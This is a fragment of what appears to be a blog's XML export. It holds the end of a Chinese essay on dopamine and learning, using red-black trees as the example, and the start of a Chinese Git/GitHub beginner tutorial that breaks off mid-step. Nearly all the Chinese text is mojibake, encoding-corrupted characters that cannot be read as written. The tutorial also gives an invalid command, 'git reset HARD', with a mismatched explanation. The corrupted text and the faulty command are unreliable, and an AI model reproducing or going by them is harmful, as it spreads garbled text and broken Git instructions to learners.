å¸¶ä¾†å¿«æ¨‚æ„Ÿè¦ºçš„ç¥ç¶“å‚³å°ç‰©è³ªå¤šå·´èƒºï¼Œæ˜¯æå‡å­¸ç¿’æ•ˆèƒ½çš„è¦è§’ä¹‹ä¸€ã€‚ç•¶é”æˆç›®æ¨™æ™‚ï¼Œå¤šå·´èƒºæœƒå¤§é‡åˆ†æ³Œä»¤äººæ¬£å–œè«åï¼ŒåŒæ™‚ä¹Ÿè®“é”æˆç›®æ¨™é‚£å€‹è¡Œç‚ºçš„ç¥ç¶“è¿´è·¯é€£çµå¾—æ›´ç·Šã€‚ ç ”ç©¶è­‰å¯¦å¤šå·´èƒºæœƒåˆºæ¿€å¤§è…¦å¯å¡‘æ€§æ”¹è®Šï¼šè¡Œç‚ºé–‹å§‹â†’ç¶“éå˜—è©¦éŒ¯èª¤çµ‚æ–¼æˆåŠŸâ†’å¾—åˆ°æˆå°±æ„Ÿå’Œå ±é…¬â†’å¤šå·´èƒºé‡‹æ”¾å¿«æ„Ÿæ¹§å‡ºâ†’å›ºåŒ–é”æˆè©²è¡Œç‚ºçš„ç¥ç¶“è¿´è·¯â†’å¢å¼·å˜—è©¦çš„å‹•æ©Ÿâ†’å†æ¬¡åšè©²è¡Œç‚ºã€‚ å–„ç”¨é€™å€‹å­¸ç¿’çš„è‰¯æ€§å¾ªç’°ï¼Œä¸åˆ†å¹´é½¡ã€æ€§æ ¼æˆ–éš›é‡ï¼Œèª°éƒ½å¯ä»¥å¼·åŒ–å­¸ç¿’ï¼Œé‡å¡‘å¤§è…¦ã€‚

ä¹Ÿå°±æ˜¯èªªï¼Œç•¶æˆ‘å€‘é–‹å§‹å­¸ç¿’æ–°æ±è¥¿çš„æ™‚å€™ï¼Œå…¶å¯¦æ˜¯å»ºç«‹é€™é¡æ–°æ±è¥¿çš„ç¥ç¶“è¿´è·¯ã€‚æ‰€ä»¥ï¼Œé‡åˆ°æŒ«æŠ˜æ™‚æ ¹æœ¬ä¸ç”¨å¤ªæ“”å¿ƒï¼å› ç‚ºï¼Œä½ åªæ˜¯é‚„åœ¨å»ºç«‹ç›¸é—œçš„è¿´è·¯è€Œå·²ï¼
ä½ å°é€™å€‹é ˜åŸŸçš„æ¯ä¸€æ¬¡æ€è€ƒã€æ¯ä¸€æ¬¡å­¸ç¿’ï¼Œéƒ½æ˜¯åœ¨æ‰“é€šç›¸é—œçš„ç¥ç¶“è¿´è·¯ï¼Œæ›è¨€ä¹‹ï¼Œä½ å°±æ˜¯ä½ è‡ªå·±è…¦è¢‹çš„æ¶æ§‹å¸«ã€‚ä½ æ‰€åšçš„äº‹æœƒå½±éŸ¿ä½ è…¦è¢‹çš„æ¶æ§‹ï¼Œè€Œé€™å€‹æ¶æ§‹èƒ½å¤ å›éé ­ä¾†å¹«åŠ©ä½ åšåˆ°ä½ æƒ³åšçš„äº‹ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œç•¶å¾ˆå¤šäººå‰›å­¸åˆ°ç´…é»‘æ¨¹é€™é¡é€²éšçš„è³‡æ–™çµæ§‹æ™‚ï¼Œå°±ç®—ä½ çŸ¥é“å­¸ç¿’ç´…é»‘æ¨¹å¾ˆæœ‰æ„ç¾©ï¼ˆç´…é»‘æ¨¹çš„æ‡‰ç”¨å¯è¦‹ æ­¤ç¯‡æ–‡ç« ï¼Œå¿ƒä¸­å¯èƒ½é‚„æ˜¯æœƒæ„Ÿåˆ°ææ‡¼ï¼Œå› ç‚ºè¦ºå¾—å¥½åƒå¾ˆé›£æ‡‚ï¼Œå„ç¨®æ“ä½œæ€éº¼é‚£éº¼è¤‡é›œã€‚
å¯æ˜¯ï¼Œå¦‚æœä½ æŠŠå¿ƒæ€æ”¾åœ¨ä½ å°è‡ªå·±è…¦è¢‹åšçš„æ¯ä¸€æ¬¡è¿´è·¯é‡å»ºï¼Œé‚£ä½ èƒ½æ„Ÿå—åˆ°æˆå°±æ„Ÿæ‰€éœ€è¦çš„é–€æª»å°±å¤§å¤§é™ä½äº†ï¼
èªªæ›´æ¸…æ¥šä¸€é»ï¼Œè«‹ä½ è©¦è‘—æƒ³åƒï¼Œä»Šå¤©çœ‹åˆ°ä¸‹é¢é€™ä¸€é»é»ä»‹ç´¹ï¼š

ä¸€èˆ¬äººçš„æƒ³æ³•å¤§æ¦‚å°±æ˜¯ï¼šã€Œæ©ï¼Œé€™å®šç¾©æ»¿ç°¡å–®çš„ï¼Œæˆ‘æœƒäº†ï¼Œæˆ‘è¦ç¹¼çºŒå¾€ä¸‹çœ‹ã€‚ã€
å¯æ˜¯ï¼Œå¦‚æœä½ äº†è§£ä½ è‡ªå·±å…‰çœ‹å®Œé€™äº›å®šç¾©ï¼Œå°±å·²ç¶“å¼·åŒ–äº†è‡ªå·±è…¦è¢‹ä¸­è·Ÿç´…é»‘æ¨¹ç›¸é—œçš„è¿´è·¯ï¼Œé‚£ä½ é€™æ™‚æœƒæ„Ÿå—åˆ°çš„å¯èƒ½æ˜¯ï¼šã€Œå–”ï¼Ÿå±…ç„¶æœƒæƒ³åˆ°å¯ä»¥æŠŠæ¨¹æ¼†æˆç´…è‰²è·Ÿé»‘è‰²çš„ï¼Œå¥½å¥‡æ€ªï¼Œä½†é€™éº¼å¥‡æ€ªçš„æ±è¥¿å±…ç„¶æœƒæ˜¯æˆ‘å€‘å¸¸ç”¨çš„ mapï¼ˆC++ STLï¼‰èƒŒå¾Œçš„å¯¦ä½œæ©Ÿåˆ¶ï¼ŒçœŸæœ‰è¶£ã€‚æ˜¯èªªï¼Œå…‰æ˜¯çœ‹åˆ°é€™å®šç¾©ï¼Œæˆ‘è…¦è¢‹ä¸­é—œæ–¼ç´…é»‘æ¨¹çš„è¿´è·¯å°±å·²ç¶“åŠ å¼·äº†ï¼Œç¹¼çºŒçœ‹çœ‹å§ã€‚ã€
ç•¶æƒ³æ³•æœ‰äº†è½‰è®Šï¼Œå°±è®“ä½ å­¸ç¿’çš„éç¨‹é–‹å§‹è½‰è®Šï¼Œä¸å†åªæ˜¯å¿«é€Ÿåœ°çœ‹éç°¡å–®çš„åœ°æ–¹ï¼Œç„¶å¾Œé‡åˆ°é›£çš„åœ°æ–¹å°±å¡ä½ï¼Œå°±ä¸æƒ³å­¸ç¿’ã€‚è€Œæ˜¯å¯ä»¥æŠŠæ¡æ¯ä¸€å€‹å°å°çš„é»ï¼Œäº†è§£é€™äº›éƒ½åªæ˜¯å¼·åŒ–ä½ è…¦è¢‹è¿´è·¯çš„éç¨‹ã€‚ç•¶ä½ æŒçºŒé€™éº¼åšï¼Œä½ ç´¯ç©çš„æ¯ä¸€å€‹å°å°çš„é»å°±æœƒè®“ä½ ç”¢ç”Ÿä¸€äº› Aha momentï¼Œé«”æœƒåˆ°åŸæœ¬ä¸æ‡‚çš„æ±è¥¿ã€è¿¸ç™¼åŸæœ¬æ²’è¯æƒ³éçš„å‰µæ„ï¼Œå†æ¬¡é‡‹æ”¾å¤šå·´èƒºï¼Œå¼·åŒ–ä½ çš„è¿´è·¯ï¼
å½¢æˆæ­£å¾ªç’°æŒæ¡äº†æ‰€å­¸äº‹ç‰©çš„æ„ç¾©åƒ¹å€¼ã€èƒ½å¤ å–„ç”¨å­¸åˆ°æ–°çŸ¥å’Œçªç ´çš„æˆå°±æ„Ÿï¼Œæ¥ä¸‹ä¾†å°±æ˜¯è®“é€™å€‹å¾ªç’°æˆå½¢ï¼Œæ—¢æ„Ÿå—åˆ°æ„ç¾©ï¼Œåˆèƒ½è—‰ç”±å­¸ç¿’çš„å¿«æ¨‚å’Œå¯¦éš›å°‡çŸ¥è­˜æ‹¿ä¾†é‹ç”¨ã€é©—è­‰å­¸é€™äº›æ±è¥¿çš„æ„ç¾©ã€‚æœ€å¾Œå°±èƒ½å½¢æˆä¸€å€‹æ­£å‘çš„å¾ªç’°ï¼Œè®“éç¨‹è¶Šä¾†è¶Šå¿«æ¨‚ã€‚
ç¸½çµé€™æ¬¡è·Ÿå¤§å®¶åˆ†äº«äº†ä¸€äº›å¯ä»¥å¹«åŠ©å¿«æ¨‚å­¸ç¿’çš„æ–¹æ³•ï¼Œé€™äº›æ–¹æ³•å°æˆ‘ä¾†èªªæ˜¯æ»¿æœ‰å¹«åŠ©çš„ï¼Œä¹Ÿå¸Œæœ›å¯ä»¥å¹«åŠ©å¤§å®¶å­¸ç¿’å¾—æ›´æ„‰å¿«ï¼
å»¶ä¼¸é–±è®€
æ¨¡æ“¬å¤§è…¦å­¸ç¿’éç¨‹ï¼ŒDeepMind ç”¨å¼·åŒ–å­¸ç¿’ç¥ç¶“ç¶²è·¯æ‰¾å‡ºäººé¡å…§åŒ–éå»ç¶“é©—è§£æ±ºæ–°ä»»å‹™çš„é—œéµ

é ‚å°–AIå¯¦é©—å®¤å»ºç«‹ç¶“é©—åˆ†äº«ï¼šå­«æ°‘é€™æ®µå½±ç‰‡è¬›åˆ°æ€éº¼è®“å­¸ç”Ÿçš„å‹•æ©Ÿå»æˆç‚ºä¸€å€‹å¥½çš„ç ”ç©¶è€…ã€‚

What are the applications of data structures?


é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Data Structure</tag>
        <tag>learning</tag>
        <tag>passion</tag>
      </tags>
  </entry>
  <entry>
    <title>Git èˆ‡ Github ç‰ˆæœ¬æ§åˆ¶åŸºæœ¬æŒ‡ä»¤èˆ‡æ“ä½œå…¥é–€æ•™å­¸</title>
    <url>/2018/01/17/learning-programming-and-coding-with-python-git-and-github-tutorial/</url>
    <content><![CDATA[
å‰è¨€è¦æˆç‚ºä¸€å€‹çœŸæ­£çš„è»Ÿé«”å·¥ç¨‹å¸«ï¼ˆSoftware Engineerï¼‰é™¤äº†æŒæ¡åŸºç¤é–‹ç™¼èƒ½åŠ›å¤–ï¼Œæ›´é‡è¦çš„æ˜¯å’Œå…¶ä»–å·¥ç¨‹å¸«å’Œé–‹ç™¼è€…åœ˜éšŠåˆä½œå’Œæºé€šçš„èƒ½åŠ›ï¼Œæ‰€ä»¥è‹¥ä½ èƒ½åŸ¹é¤Šå‡ºæŒæ¡ Git ç­‰ç‰ˆæœ¬æ§åˆ¶æ“ä½œå’Œ Git server æ¶è¨­çš„èƒ½åŠ›ï¼Œä½ æœƒæ›´å®¹æ˜“åƒèˆ‡é–‹æ”¾åŸå§‹ç¢¼ï¼ˆopen sourceï¼‰çš„ç¤¾ç¾¤å’Œææ˜‡è‡ªå·±åœ¨è·å ´ä¸Šçš„åƒ¹å€¼ã€‚å¥½ï¼Œé‚£æˆ‘å€‘å°±æº–å‚™é–‹å§‹å§ï¼
ä»€éº¼æ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»çµ±ï¼ˆVersion Control Systemï¼‰ï¼Ÿ
ç‰ˆæœ¬æ§åˆ¶ç³»çµ±æ˜¯ä¸€ç¨®è»Ÿé«”å·¥ç¨‹çš„é–‹ç™¼æŠ€å·§ï¼Œå¯ä»¥é€éé€™å€‹ç³»çµ±è®“æ¯ä½æˆå“¡çš„è»Ÿé«”ç‰ˆæœ¬å¯ä»¥æ–¹ä¾¿åŒæ­¥å’Œç¶­è­·ç®¡ç†ï¼ˆä¸ç„¶è¦ç”¨ email æˆ–æ˜¯å…¶ä»–å·¥å…·å‚³é€å’Œç®¡ç†ååˆ†éº»ç…©ï¼Œå°¤å…¶ç¨‹å¼åˆå¸¸å¸¸æœƒæœ‰ä¸åŒç‰ˆæœ¬ä¿®æ”¹çš„å•é¡Œï¼ï¼‰ã€‚åœ¨æ²’æœ‰ç‰ˆæœ¬æ§åˆ¶ç³»çµ±æ™‚ï¼Œæˆ‘å€‘å¸¸æœƒåœ¨ç·¨è¼¯æª”æ¡ˆå‰è¤‡è£½ä¸€å€‹å‚™ä»½ï¼Œæˆ–æ˜¯åœ¨æ›´æ–°æª”æ¡ˆå¾Œç”¢ç”Ÿè¨±å¤šé‡è¤‡æª”æ¡ˆï¼Œéå¸¸ä¸ä¾¿ä¸”é›£ä»¥ç¶­è­·ã€‚å› æ­¤ï¼Œä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ç³»çµ±çš„éœ€æ±‚å°±æ‡‰é‹è€Œç”Ÿå•¦ï¼

ä¸€èˆ¬åœ¨è»Ÿé«”é–‹ç™¼ä¸­åˆåˆ†ç‚ºä¸­å¤®å¼ç³»çµ±ï¼ˆä¾‹å¦‚ï¼šSubversionã€CVS ç­‰ï¼‰èˆ‡åˆ†æ•£å¼ç³»çµ±ï¼ˆä¾‹å¦‚ï¼šGitã€BitKeeperã€mercurial ç­‰ï¼‰ï¼Œä¸­å¤®å¼ç‰ˆæœ¬æ§åˆ¶ç³»çµ±çš„å·¥ä½œä¸»è¦åœ¨ä¸€å€‹ä¼ºæœå™¨é€²è¡Œï¼Œç”±ä¸­å¤®ç®¡ç†å­˜å–æ¬Šé™ã€Œé–ä¸Šã€æª”æ¡ˆåº«ä¸­çš„æª”æ¡ˆï¼Œä¸€æ¬¡åªèƒ½è®“ä¸€å€‹é–‹ç™¼è€…é€²è¡Œå·¥ä½œã€‚è€Œåˆ†æ•£å¼ç³»çµ±è®“ä¸åŒé–‹ç™¼è€…ç›´æ¥åœ¨å„è‡ªçš„æœ¬åœ°æª”æ¡ˆåº«å·¥ä½œï¼Œä¸¦å®¹è¨±å¤šå€‹é–‹ç™¼è€…åŒæ™‚æ›´å‹•åŒä¸€å€‹æª”æ¡ˆï¼Œè€Œæ¯å€‹æª”æ¡ˆåº«æœ‰å¦å¤–ä¸€å€‹åˆä½µå„å€‹æ”¹è®Šçš„åŠŸèƒ½ã€‚åˆ†æ•£å¼ç³»çµ±è®“é–‹ç™¼è€…èƒ½åœ¨æ²’æœ‰ç¶²è·¯çš„æƒ…æ³ä¸‹ä¹Ÿèƒ½ç¹¼çºŒå·¥ä½œï¼Œä¹Ÿè®“é–‹ç™¼è€…æœ‰å……åˆ†çš„ç‰ˆæœ¬æ§åˆ¶èƒ½åŠ›ï¼Œè€Œä¸éœ€ç¶“ä¸­å¤®ç®¡ç†è€…çš„è¨±å¯ï¼Œä½†åˆ†æ•£å¼ç³»çµ±ä»ç„¶å¯ä»¥æœ‰æª”æ¡ˆä¸Šé–åŠŸèƒ½ã€‚

ä»€éº¼æ˜¯ Gitï¼Ÿä»€éº¼æ˜¯ Githubï¼ŸGit æ˜¯ä¸€å€‹åˆ†æ•£å¼ç‰ˆæœ¬æ§åˆ¶è»Ÿé«”ï¼Œæœ€åˆç”± Linus Torvalds å‰µä½œï¼ˆä¹Ÿæ˜¯ä½œæ¥­ç³»çµ± Linux ç³»çµ±çš„é–‹ç™¼è€…ï¼‰ï¼Œå…¶æœ€åˆç›®çš„æ˜¯ç‚ºæ›´å¥½åœ°ç®¡ç† Linux kernel é–‹ç™¼è€Œè¨­è¨ˆï¼Œå…¶å…·å‚™å„ªç§€çš„ merge tracing åˆä½µç¨‹å¼ç¢¼çš„èƒ½åŠ›ï¼ˆä½¿ç”¨ç¨‹å¼ç¢¼ snapshot ä¾†æ¯”è¼ƒæ­·å²ç‰ˆæœ¬å·®ç•°ï¼‰ã€‚
Github å‰‡æ˜¯ä¸€å€‹æ”¯æ´ git ç¨‹å¼ç¢¼å­˜å–å’Œé ç«¯æ‰˜ç®¡çš„å¹³å°æœå‹™ï¼Œæœ‰è¨±å¤šçš„é–‹æ”¾åŸå§‹ç¢¼çš„å°ˆæ¡ˆéƒ½æ˜¯ä½¿ç”¨ Github é€²è¡Œç¨‹å¼ç¢¼çš„ç®¡ç†ã€‚è‹¥æ˜¯è®€è€…æœªä¾†æœ‰å¿—æ–¼å¾äº‹ç¨‹å¼è¨­è¨ˆç›¸é—œå·¥ä½œçš„è©±ï¼Œå»ºè­°å¯ä»¥ç†Ÿæ‚‰æŒæ¡ Git å’Œ Github çš„ä½¿ç”¨ï¼Œä¸¦å»ºç«‹è‡ªå·±çš„ Github profile ä½œå“é›†ã€‚
Git åŸºæœ¬è§€å¿µ
Git å¯ä»¥åˆ†ç‚º Localï¼ˆæœ¬åœ°ï¼‰å’Œ Remoteï¼ˆé ç«¯ï¼‰å…©å€‹ç’°å¢ƒï¼Œç”±æ–¼ Git å±¬æ–¼åˆ†æ•£å¼çš„ç‰ˆæœ¬æ§åˆ¶ç³»çµ±ï¼Œæ‰€ä»¥é–‹ç™¼è€…å¯ä»¥åœ¨é›¢ç·š local ç’°å¢ƒä¸‹é–‹ç™¼ï¼Œç­‰åˆ°æœ‰ç¶²è·¯æ™‚å†å°‡è‡ªå·±çš„ç¨‹å¼æ¨åˆ° Remote ç’°å¢ƒæˆ– pull ä¸‹å…¶ä»–é–‹ç™¼è€…ç¨‹å¼ç¢¼é€²è¡Œæ•´åˆã€‚åœ¨ Local ä¸­æˆ‘å€‘åˆåˆ†ç‚º working directoryï¼ˆå·¥ä½œè³‡æ–™å¤¾ï¼‰ã€staging areaï¼ˆæš«å­˜å€ï¼‰å’Œ repositoriesï¼ˆæª”æ¡ˆåº«ï¼‰ã€‚
ç•¶è‡ªå·±é–‹ç™¼æ™‚æœƒåœ¨å·¥ä½œè³‡æ–™å¤¾å·¥ä½œï¼Œç•¶è¦é€²å…¥æª”æ¡ˆåº«ä¹‹å‰æœƒå…ˆå°‡æª”æ¡ˆåŠ å…¥æš«å­˜å€ï¼Œç¢ºèªæ²’å•é¡Œå‰‡ commit åˆ°æª”æ¡ˆåº«ä¸­ï¼Œæœ€å¾Œ push ä¸Šå» remote ç’°å¢ƒã€‚åœ¨ Git ä¸­è‹¥æ˜¯æœ‰å’Œå…¶ä»–é–‹ç™¼è€…ä¸€èµ·åˆä½œï¼Œå‰‡æœƒéœ€è¦è™•ç†ä¸åŒ branch ä¹‹é–“ conflict å’Œ merge çš„å•é¡Œã€‚

Git èˆ‡ Github å¯¦æˆ°æ“ä½œå…¥é–€æ•™å­¸æ¥ä¸‹ä¾†æˆ‘å€‘ç”¨ä¸€å€‹å¯¦éš›çš„å¯¦æˆ°ç¯„ä¾‹è®“è®€è€…å¯ä»¥å¿«é€Ÿçš„æŒæ¡é‚£äº›åŸºç¤å¿…çŸ¥å¿…æœƒçš„ Git&#x2F;Github æ“ä½œæŠ€èƒ½ï¼š

å®‰è£ä¸¦ä¸”è¨­å®š Git
 ä»»å‹™ 1ï¼šå®‰è£ Git åˆ°ä½ çš„é›»è…¦ä¸Šï¼Œä¸¦ä¸”è¨­å®šå¥½ Git å…§éƒ¨çš„ä½¿ç”¨è€…åç¨±å’Œé›»å­ä¿¡ç®±
 Linux è‹¥æ˜¯ä½¿ç”¨ Debian åŸºç¤çš„ä½œæ¥­ç³»çµ±å¯ä»¥åœ¨çµ‚ç«¯æ©Ÿè¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤å®‰è£ gitï¼š
 $ apt-get install git

 è‹¥æ˜¯ Fedora ç³»åˆ—å¯ä»¥è¼¸å…¥ï¼š
 $ yum install git-core

 è‹¥æ˜¯ windows å¯ä»¥ä¸‹è¼‰å®‰è£ cmder é€™å€‹æ¨¡æ“¬ Linux terminal çµ‚ç«¯æ©Ÿæ™‚é¸æ“‡å®Œæ•´ç‰ˆæœ¬å°±æœƒé †ä¾¿å®‰è£æˆ–æ˜¯åˆ° Git å®˜ç¶²å®‰è£ã€‚ç•¶ç„¶åœ¨å¸‚é¢ä¸Šæœ‰è¨±å¤šå…è²» GUI åœ–å½¢åŒ–çš„ Git æ“ä½œè»Ÿé«”ï¼Œè‹¥æ˜¯åˆå­¸è€…å‰‡å»ºè­°å…ˆç†Ÿæ‚‰æ•´å€‹ git å·¥ä½œæ¨¡å¼å’ŒæŒ‡ä»¤ï¼Œå†å»ä½¿ç”¨åœ–å½¢åŒ–å·¥å…·æœƒæ¯”è¼ƒå¥½ï¼Œé€™æ¨£ä½ æ‰æ¯”è¼ƒçŸ¥é“åœ–å½¢åŒ–ç¨‹å¼èƒŒå¾Œåšäº†ä»€éº¼äº‹æƒ…ã€‚Mac å‰‡æ˜¯å¯ä»¥åˆ° Git å®˜æ–¹ç¶²ç«™ é¸æ“‡å°æ‡‰ä½œæ¥­ç³»çµ±ï¼ŒæŒ‰ç…§æ­¥é©Ÿå®Œæ•´ä¸‹è¼‰å®‰è£ã€‚å¦å¤–ä¹Ÿå¯ä»¥åƒè€ƒä¸­æ–‡å®‰è£æ•™å­¸ã€‚
 ç”±æ–¼æˆ‘å€‘æœƒé¸æ“‡ Github ç•¶ä½œé ç«¯æ‰˜ç®¡ç¨‹å¼çš„ç’°å¢ƒï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿå¯ä»¥æ ¹æ“šä½œæ¥­ç³»çµ±å®‰è£ Github æ¡Œé¢ç‰ˆç•¶ä½œæ“ä½œå·¥å…·ï¼ˆå…§å»ºå®‰è£ Gitï¼‰ã€‚
 
 è‹¥æ˜¯å®‰è£å®Œæˆï¼Œæ‰“é–‹çµ‚ç«¯æ©Ÿï¼ˆterminalï¼‰æˆ– cmder è¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼Œè‹¥æˆåŠŸé¡¯ç¤ºç‰ˆæœ¬ï¼ˆå»ºè­° Git ç‰ˆæœ¬åœ¨ 2 ä»¥ä¸Šï¼‰ï¼Œä»£è¡¨å®‰è£æˆåŠŸå›‰ï¼terminalï¼ˆçµ‚ç«¯æ©Ÿï¼‰æ˜¯ä¸€å€‹å¯ä»¥ä¸‹æŒ‡ä»¤è®“é›»è…¦åšäº‹æƒ…çš„äº’å‹•ä»‹é¢ï¼ˆä¾‹å¦‚ï¼šæ–°å¢æª”æ¡ˆã€ç§»å‹•åˆ°è³‡æ–™å¤¾ç­‰ï¼‰
 // å…¶ä¸­ $ ç‚ºæç¤ºå­—å…ƒï¼Œåœ¨è¼¸å…¥æŒ‡ä»¤æ™‚ä¸ç”¨è¼¸å…¥è©²ç¬¦è™Ÿï¼Œå¦å‰‡æœƒéŒ¯èª¤ï¼Œè‹¥æ˜¯ä½¿ç”¨ windows cmder é è¨­æ˜¯ Î»$ git --version

 æ¥ä¸‹ä¾†è¨­å®šä½ çš„å¸³æˆ¶ï¼Œè®“ Git çŸ¥é“é€™å°é›»è…¦åšçš„ä¿®æ”¹è¦é€£çµåˆ°å“ªä¸€å€‹ä½¿ç”¨è€…ï¼ˆå¾…æœƒæˆ‘å€‘è¦åœ¨ Github ä¸Šè¨»å†Šå¸³è™Ÿï¼Œå»ºè­°ä½¿ç”¨ä¸€è‡´çš„å¸³è™Ÿå’Œé›»å­ä¿¡ç®±ï¼‰ï¼š
 $ git config --global user.name &quot;&lt;Your Name&gt;&quot;

 è¨­å®šé›»å­éƒµä»¶ï¼š
 $ git config --global user.email &quot;&lt;your@gmail.com&gt;&quot;

å»ºç«‹ä¸€å€‹æœ¬æ©Ÿçš„ repository
 ä»»å‹™äºŒï¼šåœ¨è‡ªå·±çš„é›»è…¦ä¸Šå»ºç«‹ä¸€å€‹æ–°çš„ local repositoriesï¼ˆæœ¬åœ°æª”æ¡ˆåº«ï¼‰
 
 repositoryï¼ˆæª”æ¡ˆåº«ï¼‰æ˜¯ä¸€å€‹ä»€éº¼æ¨£çš„æ¦‚å¿µå‘¢ï¼Ÿäº‹å¯¦ä¸Š repository å°±æ˜¯ä¸€å€‹å°ˆæ¡ˆï¼Œåˆç°¡ç¨± repoã€‚ä»¥é›»è…¦çš„æª”æ¡ˆè³‡æ–™ç®¡ç†ä¾†çœ‹ï¼Œæˆ‘å€‘é€šå¸¸æœƒæŠŠåŒä¸€å€‹å°ˆæ¡ˆçš„è³‡æ–™æ”¾åˆ°åŒä¸€å€‹è³‡æ–™å¤¾ä¸‹ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿå¯ä»¥æŠŠ repository çœ‹æˆä¸€å€‹è³‡æ–™å¤¾ã€‚
 // å»ºç«‹ä¸€å€‹ hello-git è³‡æ–™å¤¾$ mkdir hello-git// ç§»å‹•åˆ° hello-git è³‡æ–™å¤¾$ cd hello-git// å°‡å°ˆæ¡ˆè³‡æ–™å¤¾å»ºç«‹æˆ git repository$ git init// åˆ—å‡ºå°ˆæ¡ˆè³‡æ–™å¤¾ä¸‹çš„æª”æ¡ˆå’Œè³‡æ–™å¤¾ï¼ˆ-l åƒæ•¸ç‚ºåˆ—å‡ºè©³ç´°è³‡æ–™ï¼Œ-a ç‚ºåˆ—å‡ºéš±è—è³‡æ–™å¤¾ï¼‰$ ls -la 

 ç•¶ä½ åŸ·è¡Œ git init å¾Œï¼Œä½ å¯ä»¥ç™¼ç¾å¤šå‡ºäº† .git é€™å€‹éš±è—è³‡æ–™å¤¾ï¼Œå¯ä»¥çœ‹åˆ°è£¡é¢æª”æ¡ˆå’Œè³‡æ–™å¤¾å¦‚ä¸‹ï¼š
 
 åˆ°é€™é‚Šæ­å–œè®€è€…ï¼Œå®Œæˆä½ ç¬¬ä¸€å€‹ git å°ˆæ¡ˆè³‡æ–™å¤¾æ”¹é€ è¨ˆç•«ï¼

æª¢è¦–ç‹€æ…‹ã€æ–°å¢æˆ–ä¿®æ”¹ commits
 ä»»å‹™ä¸‰ï¼šåœ¨ä½ çš„ repository æª”æ¡ˆåº«ä¸­å»ºç«‹ä¸€å€‹æ–°æª”æ¡ˆï¼Œæ–°å¢ä¸€äº›å…§å®¹åˆ°è©²æª”æ¡ˆä¸¦ä¸”å°‡é‚£äº›æª”æ¡ˆä¿®æ”¹æäº¤ commit åˆ° Git ä¸­
 æ¥è‘—æˆ‘å€‘ä½¿ç”¨æ–‡å­—ç·¨è¼¯å™¨ï¼Œæ–°å¢ä¸€å€‹ hello.py çš„æª”æ¡ˆï¼ˆè£¡é¢æ˜¯ä¸€å€‹æœƒå°å‡º hello python &amp; git å­—ä¸²çš„ python ç¨‹å¼ï¼‰ï¼š
 hello.pyprint(&#x27;hello python &amp; git&#x27;)

 ç„¶å¾Œåœ¨çµ‚ç«¯æ©Ÿçš„å°ˆæ¡ˆè³‡æ–™å¤¾ä¸‹è¼¸å…¥ git status é¡¯ç¤ºç›®å‰å·¥ä½œç’°å¢ƒç‹€æ…‹ï¼š
 $ git statusOn branch masterInitial commitUntracked files:(use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)    hello.pynothing added to commit but untracked files present (use &quot;git add&quot; to track)

 æˆ‘å€‘æœƒç™¼ç¾å› ç‚ºæˆ‘å€‘æœ‰æ–°å¢æ–°çš„æª”æ¡ˆï¼Œä½†æ˜¯é‚„æ²’é€²åˆ° git è¿½è¹¤ç¯„åœä¸­&#x2F;æš«å­˜å€ï¼Œæ‰€ä»¥æˆ‘å€‘è¦ä½¿ç”¨ git add hello.py åŠ å…¥è¿½è¹¤ï¼Œé€™æ¨£ä¹‹å¾Œæª”æ¡ˆæœ‰ä¿®æ”¹å°±å¯ä»¥è¿½è¹¤åˆ°ã€‚
 $ git add hello.py$ git statusOn branch masterInitial commitChanges to be committed:(use &quot;git rm --cached &lt;file&gt;...&quot; to unstage)    new file:   hello.py

 è‹¥æ˜¯ç¢ºèªæ²’å•é¡Œæˆ‘å€‘å°±æº–å‚™ commit é€²å» repository å›‰ï¼
 // æ¯”è¼ƒç¾åœ¨æª”æ¡ˆå’Œä¸Šæ¬¡ commit ä¹‹é–“çš„å·®ç•°ï¼Œä¹Ÿå°±æ˜¯èªªä½ åšäº†å“ªäº›ä¿®æ”¹$ git diff// -m ç‚ºè¼¸å…¥ commit messageï¼Œä¹Ÿå°±æ˜¯èªªé€™å€‹ commit å…§åšäº†å“ªäº›äº‹æƒ…$ git commit -m &quot;Init hello.py&quot;[master (root-commit) ad6d328] Init hello.py1 file changed, 1 insertion(+)create mode 100644 hello.py// commmit å®Œæˆ$ git statusOn branch masternothing to commit, working tree clean

 è‹¥æ˜¯æƒ³åæ‚”ä¸æƒ³æŠŠæª”æ¡ˆåŠ å…¥è¿½è¹¤å‘¢ï¼Ÿ
 // æª”æ¡ˆå°šæœªåŠ å…¥éè¿½è¹¤æ™‚ä½¿ç”¨ï¼Œå³å¯æ¢å¾©åˆ°æª”æ¡ˆå°šæœªåŠ å…¥æš«å­˜å€$ git rm --cached hello.py// è‹¥æª”æ¡ˆå·²ç¶“åœ¨ repository å…§ï¼Œå‰‡ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤// repository èˆ‡ stage çš„æª”æ¡ˆéƒ½æœƒè¢«é‚„åŸåˆ° HEADï¼Œä½† working directory å…§çš„æª”æ¡ˆä¸è®Š$ git reset HARD

 ç•¶ä½ è¿½è¹¤å¾Œä¿®æ”¹äº†æª”æ¡ˆï¼Œä¾‹å¦‚æŠŠ hello.py çš„å…§å®¹æ”¹æˆï¼š
 hello.pyprint(&#x27;hello python &amp; git rock&#x27;)

 è‹¥æœ‰æª”æ¡ˆä¿®æ”¹ï¼Œè¨˜å¾—è¦å† add ä¿®æ”¹çš„æª”æ¡ˆï¼ˆé€™æ˜¯æ–°æ‰‹æ¯”è¼ƒå®¹æ˜“å¿˜è¨˜çš„éƒ¨åˆ†ï¼‰ï¼Œè‹¥æ˜¯è¦æ”¾æ£„ä¿®æ”¹å¯ä»¥ä½¿ç”¨ git checkout -- æª”æ¡ˆåç¨±
